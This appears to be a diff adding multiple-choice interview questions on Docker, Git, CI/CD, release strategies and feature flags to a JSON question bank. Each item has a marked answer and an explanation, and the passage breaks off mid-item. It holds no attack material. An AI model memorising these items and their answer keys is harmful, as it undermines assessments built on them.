+      "asked": "Clarifies where health checking lives on each platform, a frequent source of confusion."
+    },
+    {
+      "id": "gt-123",
+      "q": "Where should a containerised web app write its logs?",
+      "choices": [
+        "To a log file inside the container, rotated by the app",
+        "To a file on a mounted volume so the logs survive restarts",
+        "To stdout and stderr, for the platform to collect",
+        "Directly to the log vendor's API from every request handler"
+      ],
+      "answer": 2,
+      "why": "Container runtimes capture stdout and stderr, which `docker logs`, Kubernetes and every log shipper read. Files inside the container vanish with it and fill its disk; shipping from each handler couples request latency to the vendor.",
+      "tags": ["docker", "logging"],
+      "level": 1,
+      "asked": "Part of the twelve-factor mindset; interviewers check you do not reinvent log files."
+    },
+    {
+      "id": "gt-124",
+      "q": "Your production image is distroless and `docker exec -it app sh` fails. How do you inspect the running container?",
+      "choices": [
+        "Rebuild the image with bash added back in, then redeploy it to investigate the problem",
+        "Attach a debug container that shares its namespaces, such as `kubectl debug`",
+        "Use `docker exec -it app node` to open a shell through Node instead",
+        "Distroless containers cannot be inspected at runtime by design"
+      ],
+      "answer": 1,
+      "why": "Distroless images have no shell by design. An ephemeral debug container (Kubernetes `kubectl debug`, or `docker run --pid=container:app --network=container:app` with a tools image) shares the process and network namespaces so you can inspect without changing the image.",
+      "tags": ["docker", "debugging"],
+      "level": 3,
+      "asked": "Hardened images are becoming the default; knowing how to debug them avoids 'let us just add a shell back'."
+    },
+    {
+      "id": "gt-125",
+      "q": "In GitHub Actions, Docker builds rebuild every layer on every run. What restores layer caching?",
+      "choices": [
+        "Building with `--no-cache` so Docker stores each layer",
+        "Running `docker system prune` before each build",
+        "Setting `DOCKER_BUILDKIT=0` to use the classic builder",
+        "Using buildx with a cache backend such as `type=gha`"
+      ],
+      "answer": 3,
+      "why": "Hosted runners start empty, so the local layer cache is gone. `docker/build-push-action` with `cache-from`/`cache-to` pointing at the Actions cache or a registry exports and reuses layers across runs. `--no-cache` and pruning do the opposite.",
+      "tags": ["docker", "ci", "caching"],
+      "level": 2,
+      "asked": "Connects Docker layer knowledge to CI speed."
+    },
+    {
+      "id": "gt-126",
+      "q": "Which statement about image vulnerability scanning (for example Trivy) in CI is accurate?",
+      "choices": [
+        "It finds known CVEs in OS packages and libraries in the image",
+        "It proves the image contains no exploitable vulnerabilities",
+        "It only scans your own source code, not the base image",
+        "It must run inside the production cluster to be accurate"
+      ],
+      "answer": 0,
+      "why": "Scanners compare installed package versions in the image with vulnerability databases. They find known issues only, and the base image is usually the largest source of findings, which is why teams update bases regularly and prefer slim or distroless ones.",
+      "tags": ["docker", "security", "ci"],
+      "level": 1,
+      "asked": "Supply-chain hygiene; the strong answer mentions triage and base image updates."
+    },
+    {
+      "id": "gt-127",
+      "q": "What is the core idea of trunk-based development with short-lived branches?",
+      "choices": [
+        "Every developer commits straight to main with no review at all",
+        "Branches live for a day or two and merge to main behind flags if unfinished",
+        "Each release gets a long-lived branch that features are merged into",
+        "Main is frozen during releases, and new work continues on a separate develop branch"
+      ],
+      "answer": 1,
+      "why": "Integrating small changes into main continuously keeps merge conflicts small and main releasable; unfinished features ship dark behind flags. Review still happens on the short-lived PRs. Long-lived release and develop branches are GitFlow's model.",
+      "tags": ["git", "process", "release-flow"],
+      "level": 1,
+      "asked": "Asked to see whether you understand why long-lived branches hurt, not just which model your last team used."
+    },
+    {
+      "id": "gt-128",
+      "q": "When does a release-branch model (cut `release/2.4`, stabilise, ship) make more sense than deploying main continuously?",
+      "choices": [
+        "When the team has fewer than five developers",
+        "When the product is a web app deployed several times a day",
+        "When you ship versioned releases and must patch older versions",
+        "When tests are fast and the pipeline is fully automated"
+      ],
+      "answer": 2,
+      "why": "Mobile apps, installed software and libraries ship discrete versions and must hotfix 2.4 while 2.5 is in progress, so a branch per release is useful. A continuously deployed web app has one version in production and gains little from it.",
+      "tags": ["git", "process", "release-flow"],
+      "level": 2,
+      "asked": "Tests whether you pick a branching model from constraints rather than habit."
+    },
+    {
+      "id": "gt-129",
+      "q": "Production runs `release/3.1`. You fix a critical bug. How do you make sure the fix is not lost in the next release?",
+      "choices": [
+        "Fix it on main, merge main into the release branch, and deploy",
+        "Fix it on the release branch only, since main will be rewritten anyway",
+        "Fix it in production directly, then commit the same change later",
+        "Fix it on one branch and cherry-pick it to the other, or merge back"
+      ],
+      "answer": 3,
+      "why": "Whether you fix on main and cherry-pick to the release branch, or fix on the release branch and merge back, the fix must land on both, or the next release regresses. Merging all of main into a release branch drags in unreleased features.",
+      "tags": ["git", "release-flow", "incident-response"],
+      "level": 2,
+      "asked": "Regressions from forgotten hotfixes are a real failure mode; interviewers want the 'land it in both places' habit."
+    },
+    {
+      "id": "gt-130",
+      "q": "Which version sorts first under semantic versioning?",
+      "choices": [
+        "`2.0.0`",
+        "`2.0.0-rc.1`",
+        "`2.0.0+build.5`",
+        "They are all equal, since only major.minor.patch counts"
+      ],
+      "answer": 1,
+      "why": "A pre-release suffix makes a version lower than the plain release, so `2.0.0-rc.1` < `2.0.0`. Build metadata after `+` is ignored for precedence, so `2.0.0+build.5` equals `2.0.0`.",
+      "tags": ["versioning"],
+      "level": 2,
+      "asked": "Relevant to publishing packages and release candidates; build metadata is the trap."
+    },
+    {
+      "id": "gt-131",
+      "q": "What is a canary release?",
+      "choices": [
+        "Deploying to a full staging copy of production that only receives synthetic traffic from load tests",
+        "Shipping the new version to a small share of real traffic and widening it if metrics hold",
+        "Running old and new versions side by side and switching all traffic at once",
+        "Releasing only to internal staff through a separate hostname"
+      ],
+      "answer": 1,
+      "why": "A canary exposes the new version to, say, 5% of production traffic, compares error rates and latency with the baseline, then widens or rolls back. Switching all traffic at once is blue/green, and staff-only access is dogfooding.",
+      "tags": ["deployment", "release-flow"],
+      "level": 1,
+      "asked": "Standard deployment vocabulary; the strong answer names the metrics that gate promotion."
+    },
+    {
+      "id": "gt-132",
+      "q": "A canary at 5% shows the same error rate as the baseline, but p99 latency doubled. What should an automated rollout do?",
+      "choices": [
+        "Promote it, since only the error rate matters for correctness",
+        "Promote it, as long as the median latency is unchanged",
+        "Hold or roll back, because latency is a gating metric too",
+        "Restart the canary pods, then promote once p99 recovers"
+      ],
+      "answer": 2,
+      "why": "Canary analysis should gate on the signals users feel, including tail latency, not just errors. A doubled p99 often precedes errors under full load, and restarting hides the regression rather than explaining it.",
+      "tags": ["deployment", "release-flow", "observability"],
+      "level": 3,
+      "asked": "Tests whether you understand that 'no errors' is not the same as 'healthy'."
+    },
+    {
+      "id": "gt-133",
+      "q": "A deploy broke checkout. The fix is a one-line change you are confident in. Roll back or roll forward?",
+      "choices": [
+        "Roll forward always, because rollbacks lose data",
+        "Roll back first if it is safe and fast, then ship the fix calmly",
+        "Roll back only after the postmortem has confirmed the root cause",
+        "Roll forward, but skip CI so the fix lands sooner"
+      ],
+      "answer": 1,
+      "why": "Restoring service is the priority, and a tested rollback is usually faster and less risky than a rushed fix. Rolling forward is right when rollback is unsafe, for example after an irreversible migration, and it still goes through CI.",
+      "tags": ["deployment", "incident-response"],
+      "level": 2,
+      "asked": "A judgement question; skipping CI under pressure is the answer interviewers are hoping you avoid."
+    },
+    {
+      "id": "gt-134",
+      "q": "Why should the same built artifact be promoted from staging to production rather than rebuilt for production?",
+      "choices": [
+        "Rebuilding takes longer, which delays the release by a few minutes",
+        "Rebuilding can produce different bits than the ones you tested",
+        "Production registries only accept images pushed from staging",
+        "Staging artifacts contain debug symbols that production needs"
+      ],
+      "answer": 1,
+      "why": "A rebuild may pull different dependency or base-image versions and produce something that was never tested. Build once, tag it immutably, and promote that exact artifact with environment-specific configuration injected at deploy time.",
+      "tags": ["deployment", "ci"],
+      "level": 2,
+      "asked": "Core CD principle; ties into image digests and configuration outside the build."
+    },
+    {
+      "id": "gt-135",
+      "q": "A workflow should build and publish a release whenever a version tag is pushed. Which trigger fits?",
+      "choices": [
+        "`on: release: types: [deleted]`",
+        "`on: push: branches: ['v*']`",
+        "`on: schedule` with a daily cron",
+        "`on: push: tags: ['v*']`"
+      ],
+      "answer": 3,
+      "why": "Tag filters under `push` run the workflow when a matching tag is pushed, and `github.ref_name` then holds the version. A `branches` filter matches branch names, not tags.",
+      "tags": ["ci", "github-actions", "versioning"],
+      "level": 1,
+      "asked": "Practical release automation; follows naturally from tagging questions."
+    },
+    {
+      "id": "gt-136",
+      "q": "What is the main hidden cost of feature flags, and how do teams control it?",
+      "choices": [
+        "They slow every request, so flags are evaluated only at startup",
+        "They require a vendor, so teams build their own flag service",
+        "Stale flags pile up as dead branches; give each an owner and removal date",
+        "They break caching, so flagged pages must disable HTTP caching"
+      ],
+      "answer": 2,
+      "why": "Every flag doubles a code path to test, and forgotten flags become permanent complexity or surprise behaviour when flipped years later. Short-lived release flags need an owner, an expiry and a ticket to remove them; long-lived ops flags are documented as such.",
+      "tags": ["deployment", "feature-flags", "process"],
+      "level": 2,
+      "asked": "Follows 'what is a feature flag'; knowing the cost is the mid-level answer."
+    },
+    {
+      "id": "gt-137",
+      "q": "You roll a feature out to 10% of users with a flag. How should the flag decide which users are in the 10%?",
+      "choices": [
+        "`Math.random() < 0.1` on each request",
+        "A stable hash of the user id, bucketed into 100 slots",
+        "The first 10% of users to log in each day, tracked in a counter",
+        "Users whose id ends in 0, checked in the database"
+      ],
+      "answer": 1,
+      "why": "Hashing the user id (with the flag key as salt) gives each user a stable bucket, so they see the same variant on every request and widening to 20% keeps the original 10% in. Per-request randomness makes the UI flip between versions.",
+      "tags": ["feature-flags", "release-flow"],
+      "level": 2,
+      "asked": "Tests understanding of sticky assignment, which matters for both UX and experiment validity."
+    },
+    {
+      "id": "gt-138",
+      "q": "What is a kill switch in the context of feature flags?",
+      "choices": [
+        "A flag that shuts down the entire application during an incident",
+        "A CI setting that stops all deploys while a flag is being changed",
+        "A flag that turns off one risky feature at runtime, without a deploy",
+        "A database trigger that disables writes when an error threshold is hit"
+      ],
+      "answer": 2,
+      "why": "A kill switch is an operational flag around a risky dependency or feature, such as a new payment provider, so on-call can disable it in seconds without a deploy. It is scoped to one feature, not the whole system.",
+      "tags": ["feature-flags", "incident-response"],
+      "level": 1,
+      "asked": "Shows you think about operating features, not just shipping them."
+    },
+    {
+      "id": "gt-139",
+      "q": "Why must a feature flag that hides a new admin endpoint be checked on the server, not only in the React UI?",
+      "choices": [
+        "Server-side checks are faster, because the flag is cached in memory",
+        "React cannot read feature flags without a full page reload",
+        "Hiding the button does not stop anyone calling the API directly",
+        "Flags checked in the browser are logged, which leaks the rollout"
+      ],
+      "answer": 2,
+      "why": "A client-side flag only changes what is rendered; the endpoint stays reachable with any HTTP client. Anything that gates access or behaviour must be enforced by the API, with the UI flag as a convenience.",
+      "tags": ["feature-flags", "security"],
+      "level": 2,
+      "asked": "Links flags to the rule that the client is untrusted, which interviewers like to see applied."
+    },
+    {
+      "id": "gt-140",
+      "q": "What does 'dark launching' a new backend feature mean?",
+      "choices": [
+        "Deploying it outside business hours to reduce the number of affected users",
+        "Shipping it without release notes so users discover it gradually",
+        "Deploying it to production running on real traffic, with results hidden from users",
+        "Releasing it to one region first, while the other regions are kept offline until it is proven"
+      ],
+      "answer": 2,
+      "why": "In a dark launch the new path runs in production, for example computing prices both ways or shadow-writing to a new store, while users still see the old result. It tests load and correctness on real traffic before anyone depends on it.",
+      "tags": ["release-flow", "feature-flags"],
+      "level": 3,
+      "asked": "Shows familiarity with low-risk rollout techniques beyond on/off flags."
+    },
+    {
+      "id": "gt-141",
+      "q": "You forked a repository. How do you bring your fork's `main` up to date with the original project?",
+      "choices": [
+        "Run `git pull origin main`, which fetches from the original project automatically",
+        "Add the original as a remote such as `upstream`, fetch it, and merge or rebase",
+        "Delete the fork and fork it again whenever the original moves ahead of you",
+        "Push your `main` to the original, which merges its changes back into your fork"
+      ],
+      "answer": 1,
+      "why": "`origin` is your fork; it knows nothing about new commits upstream. `git remote add upstream <url>`, `git fetch upstream` and then `git merge upstream/main` (or rebase) syncs it, and a push updates the fork on GitHub.",
+      "tags": ["git"],
+      "level": 1,
+      "asked": "Everyday open-source workflow; shows you understand remotes are just named URLs."
+    },
+    {
+      "id": "gt-142",
+      "q": "What does `git push -u origin feature/x` add over `git push origin feature/x`?",
+      "choices": [
+        "It sets `origin/feature/x` as the upstream so plain `git push` and `git pull` work",
+        "It forces the push, overwriting any commits already on the remote branch",
+        "It pushes all local branches that have a matching name on the remote",
+        "It pushes the branch together with every tag that points into it, in a single operation"
+      ],
+      "answer": 0,
+      "why": "`-u` (`--set-upstream`) records the tracking relationship, so later `git push`, `git pull` and `git status` ahead/behind counts know which remote branch to use. Setting `push.autoSetupRemote=true` does this automatically on first push.",
+      "tags": ["git"],
+      "level": 1,
+      "asked": "Basic, but it explains the 'no upstream branch' error that confuses newcomers."
+    },
+    {
+      "id": "gt-143",
+      "q": "Remote branches deleted on GitHub still show up in `git branch -r`. What removes the stale ones?",
+      "choices": [
+        "`git branch -D origin/old-branch` for each one",
+        "`git gc --aggressive`",
+        "`git fetch --prune`",
+        "`git remote update --force`"
+      ],
+      "answer": 2,
+      "why": "Remote-tracking branches are local copies that fetch updates but does not delete by default. `--prune` (or `fetch.prune=true`) removes those whose remote branch is gone. `git branch -D` targets local branches, not `origin/*` refs.",
+      "tags": ["git"],
+      "level": 1,
+      "asked": "Small hygiene question that checks you know remote-tracking branches are local refs."
+    },
+    {
+      "id": "gt-144",
+      "q": "How do you delete the branch `old-feature` from the remote?",
+      "choices": [
+        "`git branch -d origin/old-feature`",
+        "`git push origin --delete old-feature`",
+        "`git remote remove old-feature`",
+        "`git fetch --prune --delete old-feature origin`"
+      ],
+      "answer": 1,
+      "why": "Deleting a remote branch is a push of 'nothing' to that ref: `git push origin --delete old-feature` (or `git push origin :old-feature`). Deleting `origin/old-feature` locally only removes your tracking copy, and `git remote remove` deletes the whole remote configuration.",
+      "tags": ["git"],
+      "level": 1,
+      "asked": "Everyday mechanics; the old colon syntax is a nice bonus to recognise."
+    },
+    {
+      "id": "gt-145",
+      "q": "You set `git config --global pull.ff only`. What happens when your local branch and the remote have both moved on?",
+      "choices": [
+        "Git merges them with a merge commit, as the default pull does",
+        "Git rebases your commits on top of the remote automatically",
+        "Git discards your local commits and fast-forwards to the remote",
+        "The pull refuses, so you choose to merge or rebase deliberately"
+      ],
+      "answer": 3,
+      "why": "With `ff only`, pull succeeds only when your branch can simply move forward. If histories have diverged it stops, rather than creating a surprise merge commit. You then run `git pull --rebase` or `git merge` on purpose.",
+      "tags": ["git"],
+      "level": 2,
+      "asked": "Shows you have an opinion about keeping history clean and know how to configure Git for it."
+    },
+    {
+      "id": "gt-146",
+      "q": "What is the difference between `git merge --ff-only` and `git merge --no-ff`?",
+      "choices": [
+        "`--ff-only` refuses unless it can fast-forward; `--no-ff` always creates a merge commit",
+        "`--ff-only` squashes the branch into one commit; `--no-ff` keeps all the branch's commits",
+        "`--ff-only` keeps your side on conflicts; `--no-ff` keeps theirs",
+        "`--ff-only` merges only the first commit; `--no-ff` merges the whole branch"
+      ],
+      "answer": 0,
+      "why": "A fast-forward just moves the pointer when there is nothing to reconcile. `--ff-only` guarantees linear history or failure; `--no-ff` forces a merge commit even when a fast-forward was possible, which some teams want so each feature is one identifiable merge.",
+      "tags": ["git", "merge"],
+      "level": 2,
+      "asked": "Tests whether you know what a fast-forward is, which underlies most merge-strategy discussions."
+    },
+    {
+      "id": "gt-147",
+      "q": "You want a readable history of main showing one entry per merged PR, even though merge commits were used. Which option helps?",
+      "choices": [
+        "`git log --merges-only --flat`",
+        "`git log --first-parent main`",
+        "`git log --no-walk main`",
+        "`git log --reverse main`"
+      ],
+      "answer": 1,
+      "why": "Following only first parents walks main's own line: each merge commit appears, but the commits inside merged branches do not. `--merges` would list only merge commits, and `--no-walk` shows just the named commit. It is also the view `git bisect --first-parent` uses.",
+      "tags": ["git", "history"],
+      "level": 3,
+      "asked": "Useful on repos with merge commits; shows you can make history readable without rewriting it."
+    },
+    {
+      "id": "gt-148",
+      "q": "You made two unrelated changes in one file and want to commit them separately. What do you use?",
+      "choices": [
+        "`git commit --split file.ts`",
+        "`git add -p file.ts` to stage selected hunks",
+        "`git stash -p` and then two separate `git commit -a` runs",
+        "`git add file.ts` twice, once for each change"
+      ],
+      "answer": 1,
+      "why": "Patch mode walks through each hunk and lets you stage only some, split hunks or edit them; commit, then stage the rest. Small, focused commits make review, revert and bisect far easier. There is no `--split` flag, and staging the file twice stages it all.",
+      "tags": ["git"],
+      "level": 1,
+      "asked": "A signal of care about commit quality; interviewers like candidates who can shape commits deliberately."
+    },
+    {
+      "id": "gt-149",
+      "q": "`git commit -am \"wip\"` did not include a new file you created. Why?",
+      "choices": [
+        "`-a` only stages modified and deleted tracked files, never untracked ones",
+        "`-a` skips files larger than 1 MB unless `--all-sizes` is passed",
+        "The file is ignored, because new files are ignored until the first push",
+        "`-m` overrides `-a`, so only files that were already staged beforehand were committed"
+      ],
+      "answer": 0,
+      "why": "`-a` is shorthand for staging changes to files Git already tracks. A new file must be added explicitly with `git add` the first time. This is a safety feature: stray build output does not sneak into commits.",
+      "tags": ["git"],
+      "level": 1,
+      "asked": "A quick fundamentals check about what tracked means."
+    },
+    {
+      "id": "gt-150",
+      "q": "What does `git diff --staged` show that plain `git diff` does not?",
+      "choices": [
+        "Changes between your branch and the remote branch it tracks",
+        "Changes in the index that will go into the next commit",
+        "Changes to untracked files that have not been added yet",
+        "Changes stashed with `git stash` that have not been reapplied"
+      ],
+      "answer": 1,
+      "why": "Plain `git diff` compares the working tree with the index (unstaged changes); `--staged` (alias `--cached`) compares the index with HEAD, which is exactly what `git commit` will record. Reviewing it before committing catches stray debug lines.",
+      "tags": ["git"],
+      "level": 1,
+      "asked": "Tests the three-area model: working tree, index, HEAD."
+    },
+    {
+      "id": "gt-151",
+      "q": "Your build left untracked files everywhere. What should you run before `git clean -fd` to avoid deleting something important?",
+      "choices": [
+        "`git clean -n -d`, a dry run that lists what would be removed",
+        "`git stash`, which saves untracked files by default",
+        "`git status --ignored`, which marks files as safe to delete",
+        "`git reset --hard`, which moves untracked files into the system trash first"
+      ],
+      "answer": 0,
+      "why": "`git clean` permanently deletes untracked files and nothing in Git can bring them back, so preview with `-n`. Plain `git stash` skips untracked files, and `reset --hard` does not touch them at all.",
+      "tags": ["git", "recovery"],
+      "level": 1,
+      "asked": "Tests caution with one of the few truly destructive Git commands."
+    },
+    {
+      "id": "gt-152",
+      "q": "On macOS you rename `userCard.tsx` to `UserCard.tsx`. Git shows no change, and the Linux CI build fails with 'module not found'. What is going on?",
+      "choices": [
+        "Git ignores file renames unless they also change the file's contents",
+        "Linux CI caches file names from its first build, so the runner cache needs to be cleared",
+        "The file system is case-insensitive, so Git never saw the rename; use `git mv`",
+        "TypeScript on Linux requires every file name to be lower case"
+      ],
+      "answer": 2,
+      "why": "macOS and Windows file systems are usually case-insensitive, so Git (with `core.ignorecase`) does not notice a case-only rename, while imports now use the new case. `git mv userCard.tsx UserCard.tsx` records it. Linux is case-sensitive, so the old name in Git no longer matches.",
+      "tags": ["git", "ci"],
+      "level": 2,
+      "asked": "A classic cross-platform bug; knowing the fix saves an hour of confusion."
+    },
+    {
+      "id": "gt-153",
+      "q": "What does enabling `git config rerere.enabled true` give you?",
+      "choices": [
+        "Git reapplies recorded conflict resolutions when the same conflict recurs",
+        "Git retries failed pushes automatically after the remote rejects them as non-fast-forward",
+        "Git re-runs pre-commit hooks after every rebase step",
+        "Git refuses to rebase any branch that has been pushed"
+      ],
+      "answer": 0,
+      "why": "'Reuse recorded resolution' remembers how you resolved a given conflict hunk and applies it automatically next time, which helps with repeated rebases of a long-lived branch. You still review and stage the result.",
+      "tags": ["git", "merge-conflicts"],
+      "level": 3,
+      "asked": "A niche but telling feature; people who rebase long branches often discover it the hard way."
+    },
+    {
+      "id": "gt-154",
+      "q": "Why do teams use Git LFS for large binary assets such as design files or videos?",
+      "choices": [
+        "LFS compresses binaries so they diff line by line like source code",
+        "LFS stores pointers in Git and the files elsewhere, keeping clones small",
+        "LFS encrypts binaries so they cannot be read from the repository",
+        "LFS lets Git merge binary files that conflict by keeping both versions side by side"
+      ],
+      "answer": 1,
+      "why": "Every version of every binary committed normally lives in the history forever, so clones grow without bound. LFS commits small pointer files and downloads the real content on demand. It does not make binaries diffable, mergeable or encrypted.",
+      "tags": ["git", "tooling"],
+      "level": 2,
+      "asked": "Relevant when a repo gets slow; the strong answer knows history keeps every version."
+    },
+    {
+      "id": "gt-155",
+      "q": "A repository uses a Git submodule for a shared library. After `git pull`, the library code is at the old version. Why?",
+      "choices": [
+        "Submodules only update when the library's own `main` changes",
+        "Submodules are read-only, so they must be deleted and re-added to pick up a new version",
+        "The parent records a commit; run `git submodule update` to check it out",
+        "`git pull` updated it, but the editor is showing a cached copy"
+      ],
+      "answer": 2,
+      "why": "The parent repository stores the exact commit of each submodule, and pulling updates that pointer but not the checked-out files. `git submodule update --init --recursive` (or `git pull --recurse-submodules`) syncs them. This pinning is also why submodules are awkward for fast-moving shared code.",
+      "tags": ["git", "tooling"],
+      "level": 2,
+      "asked": "Submodules confuse most people; the strong answer knows they pin a commit and weighs packages as an alternative."
+    },
+    {
+      "id": "gt-156",
+      "q": "You need to view `config.json` exactly as it was in commit `a1b2c3d` without changing your working tree. Which command?",
+      "choices": [
+        "`git checkout a1b2c3d config.json`",
+        "`git reset a1b2c3d config.json`",
+        "`git log -p a1b2c3d config.json`",
+        "`git show a1b2c3d:config.json`"
+      ],
+      "answer": 3,
+      "why": "The `<rev>:<path>` syntax names a blob in that commit's tree and `git show` prints it. `checkout <rev> <path>` overwrites your working copy and index, and reset changes the index. `git log -p` shows diffs, not the whole file.",
+      "tags": ["git"],
+      "level": 2,
+      "asked": "Handy during debugging; shows fluency with revision syntax."
+    },
+    {
+      "id": "gt-157",
+      "q": "A teammate's commit on main introduced a bug and was later reverted. Now the fixed feature should land again. What is the cleanest way?",
+      "choices": [
+        "Cherry-pick the original commit again, since reverts are ignored by Git",
+        "Revert the revert commit, then add the fix on top",
+        "Reset main to before the revert and force-push",
+        "Merge the original feature branch again, which reapplies it"
+      ],
+      "answer": 1,
+      "why": "Git considers the original commits already in main, so re-merging the old branch brings nothing back. Reverting the revert restores the change in the open, and the follow-up commit fixes the bug. Force-pushing shared main is never the answer.",
+      "tags": ["git", "recovery"],
+      "level": 3,
+      "asked": "Tests understanding that a revert is a new commit, not an erasure."
+    },
+    {
+      "id": "gt-158",
+      "q": "What does `git cherry-pick -x <sha>` add over a plain cherry-pick?",
+      "choices": [
+        "It excludes merge commits from the pick",
+        "It deletes the original commit after copying it",
+        "It notes the source commit's SHA in the new commit message",
+        "It picks the commit without running any of the local commit hooks"
+      ],
+      "answer": 2,
+      "why": "`-x` appends '(cherry picked from commit ...)' to the message, which is useful when backporting a fix to a release branch because it links the two commits for anyone reading history later. The original commit is untouched.",
+      "tags": ["git", "release-flow"],
+      "level": 2,
+      "asked": "Backporting hygiene; relevant to release-branch workflows."
+    },
+    {
+      "id": "gt-159",
+      "q": "Your monorepo clone takes 20 minutes. Which clone option downloads full history but fetches file contents only when needed?",
+      "choices": [
+        "`git clone --depth 1`",
+        "`git clone --single-branch --no-tags`",
+        "`git clone --filter=blob:none`",
+        "`git clone --bare`"
+      ],
+      "answer": 2,
+      "why": "A blobless partial clone downloads all commits and trees but fetches blobs lazily, so log and blame still work. `--depth 1` truncates history, which breaks describe and blame, and `--bare` has no working tree at all.",
+      "tags": ["git", "tooling"],
+      "level": 3,
+      "asked": "Relevant for large repos and CI; knowing the trade-off with shallow clones is the point."
+    },
+    {
+      "id": "gt-160",
+      "q": "You want to use your work email in one folder of repositories and your personal email everywhere else. What does Git offer?",
+      "choices": [
+        "A `.gitemail` file committed at the root of each repository",
+        "Setting `user.email` in `.gitignore`",
+        "An environment variable that must be exported in every terminal session",
+        "A conditional include such as `includeIf \"gitdir:~/work/\"`"
+      ],
+      "answer": 3,
+      "why": "`includeIf` in the global config loads another config file for repositories under a path, so work repos pick up the work email automatically. A per-repo `git config user.email` also works but is easy to forget.",
+      "tags": ["git", "tooling"],
+      "level": 2,
+      "asked": "A practical setup question; it prevents personal addresses leaking into company history."
+    },
+    {
+      "id": "gt-161",
+      "q": "What does a signed commit or tag (GPG, SSH or Sigstore signature) prove?",
+      "choices": [
+        "That the commit passed CI before it was pushed",
+        "That the holder of a specific key created it",
+        "That the code was reviewed by another developer",
+        "That the author email address is verified by GitHub"
+      ],
+      "answer": 1,
+      "why": "Anyone can set `user.name` and `user.email` to anything, so author fields prove nothing. A signature proves possession of a private key, which the hosting service can map to an account. It says nothing about review or CI.",
+      "tags": ["git", "security"],
+      "level": 2,
+      "asked": "Asked where supply-chain integrity matters; the strong answer knows author fields are unauthenticated."
+    },
+    {
+      "id": "gt-162",
+      "q": "What is the difference between ESLint and Prettier in a JS/TS project?",
+      "choices": [
+        "ESLint formats code; Prettier finds bugs such as unused variables",
+        "ESLint only works on JavaScript; Prettier only works on TypeScript",
+        "ESLint runs only in CI pipelines; Prettier runs only inside the developer's editor",
+        "ESLint finds problems and bad patterns; Prettier only rewrites formatting"
+      ],
+      "answer": 3,
+      "why": "Prettier is an opinionated formatter with almost no rules about correctness; ESLint analyses code for bugs and conventions such as unused variables or missing hook dependencies. Teams turn off ESLint's stylistic rules so the two never fight.",
+      "tags": ["tooling"],
+      "level": 1,
+      "asked": "A quick tooling-literacy check."
+    },
+    {
+      "id": "gt-163",
+      "q": "CI runs `eslint . --max-warnings 0`. What does that achieve?",
+      "choices": [
+        "Warnings are suppressed so only errors are printed",
+        "Any warning fails the build, so warnings cannot pile up",
+        "ESLint stops after the first file with a warning",
+        "Warnings are converted into autofixes and committed back to the branch"
+      ],
+      "answer": 1,
+      "why": "Without it, warnings never fail the build and accumulate until nobody reads them. With a zero budget, a warning must be fixed or explicitly disabled with a reason. Autofix is `--fix` and needs a separate commit step.",
+      "tags": ["tooling", "ci"],
+      "level": 2,
+      "asked": "Tests whether you think about lint signal decaying over time."
+    },
+    {
+      "id": "gt-164",
+      "q": "Why do repositories include an `.editorconfig` file?",
+      "choices": [
+        "It configures the linter's rules for every language in the repo",
+        "It stops the editor from opening files outside the repository",
+        "It sets indentation, line endings and final newlines across editors",
+        "It stores the list of recommended editor extensions and themes for the project"
+      ],
+      "answer": 2,
+      "why": "EditorConfig is read by most editors to apply basic whitespace settings per file type, so a teammate on a different editor does not reindent files. Recommended extensions live in editor-specific files such as `.vscode/extensions.json`.",
+      "tags": ["tooling"],
+      "level": 1,
+      "asked": "Small but practical team hygiene."
+    },
+    {
+      "id": "gt-165",
+      "q": "Which statement about `npx some-cli` is correct?",
+      "choices": [
+        "It installs the package globally so later runs of the same command are instant",
+        "It runs the local binary if installed, else fetches the package to run",
+        "It only runs packages already listed in `package.json`",
+        "It runs the command with elevated permissions"
+      ],
+      "answer": 1,
+      "why": "`npx` resolves binaries from `node_modules/.bin` first and otherwise downloads the package to a cache and runs it, prompting first in recent npm versions. Relying on the local devDependency keeps everyone on the version in the lockfile.",
+      "tags": ["npm", "tooling"],
+      "level": 1,
+      "asked": "Helps explain why tools should be devDependencies rather than global installs."
+    },
+    {
+      "id": "gt-166",
+      "q": "Your team keeps a `CHANGELOG.md`. What makes it genuinely useful to users?",
+      "choices": [
+        "Grouping entries by version with added, changed, fixed and breaking notes",
+        "Pasting the full output of `git log` for each release",
+        "Listing every commit author and the number of lines they changed in each release",
+        "Keeping it in a wiki, separate from the code it describes"
+      ],
+      "answer": 0,
+      "why": "Users need to know what changed and whether they must act, which means human-readable entries per version with breaking changes called out. Raw commit logs include refactors and typos and hide what matters.",
+      "tags": ["versioning", "process"],
+      "level": 1,
+      "asked": "Shows you think about the people consuming a release, not just producing it."
+    },
+    {
+      "id": "gt-167",
+      "q": "What is the difference between continuous delivery and continuous deployment?",
+      "choices": [
+        "Delivery deploys every commit to production automatically; deployment batches releases weekly",
+        "Delivery keeps every build releasable; deployment actually ships each one automatically",
+        "Delivery is for frontends; deployment is for backend services",
+        "Delivery needs manual tests; deployment has no tests"
+      ],
+      "answer": 1,
+      "why": "Continuous delivery means any green build could go to production at the push of a button; continuous deployment removes the button so every green commit ships. Both need automated tests and a reliable pipeline.",
+      "tags": ["ci", "cd"],
+      "level": 1,
+      "asked": "Vocabulary question often asked to check you are not using the terms interchangeably."
+    },
+    {
+      "id": "gt-168",
+      "q": "A deploy script runs `kubectl apply` then immediately reports success. A minute later the new pods are crash-looping. What was missing?",
+      "choices": [
+        "Waiting for the rollout to complete, for example `kubectl rollout status`",
+        "Running `kubectl apply` twice so the change is definitely registered",
+        "A `sleep 60` after apply to give the cluster time to settle",
+        "Deleting the old pods by hand before applying the new manifest so none linger"
+      ],
+      "answer": 0,
+      "why": "`apply` only submits the desired state; the rollout happens afterwards. `kubectl rollout status` (or the platform's equivalent) blocks until new pods are ready or the rollout fails, so the pipeline can report failure and roll back. A fixed sleep is guesswork.",
+      "tags": ["cd", "kubernetes", "deployment"],
+      "level": 2,
+      "asked": "Tests whether your pipeline verifies the deploy rather than just firing it."
+    },
+    {
+      "id": "gt-169",
+      "q": "Why do mature pipelines run a smoke test against production right after each deploy?",
+      "choices": [
+        "To warm the CDN cache before users arrive",
+        "To confirm the running release can serve a real request end to end",
+        "To replace the unit tests, which cannot run in CI",
+        "To load-test production at peak capacity after every deploy, before users arrive"
+      ],
+      "answer": 1,
+      "why": "A healthy process is not a working app: a smoke test hits a key endpoint or page and fails the deploy, triggering a rollback, if configuration, secrets or connectivity are wrong. It is a few requests, not a load test.",
+      "tags": ["cd", "deployment", "testing"],
+      "level": 2,
+      "asked": "Connects to 'green pipeline, broken production'; the strong answer ties it to automatic rollback."
+    },
+    {
+      "id": "gt-170",
+      "q": "What is an expand/contract (parallel change) migration?",
+      "choices": [
